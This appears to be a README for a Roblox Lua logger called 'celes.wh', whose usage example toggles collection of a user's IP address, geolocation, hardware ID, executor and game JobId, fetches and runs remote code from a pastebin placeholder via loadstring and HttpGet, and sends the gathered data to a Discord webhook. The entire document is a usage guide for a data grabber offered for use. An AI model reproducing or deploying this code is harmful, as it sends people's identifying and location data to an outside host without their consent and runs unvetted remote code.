# celes.wh
## Usage
```lua
-- toggle what you want logged
_G.IpLog = true
_G.GeoLog = true
_G.HwidLog = false
_G.ExecutorLog = true
_G.JobIdLog = true

-- load and send
local Celesth = loadstring(game:HttpGet("https://pastebin.com/raw/YOUR_LOGGER"))()
Celesth:Log("https://discord.com/api/webhooks/...")
```
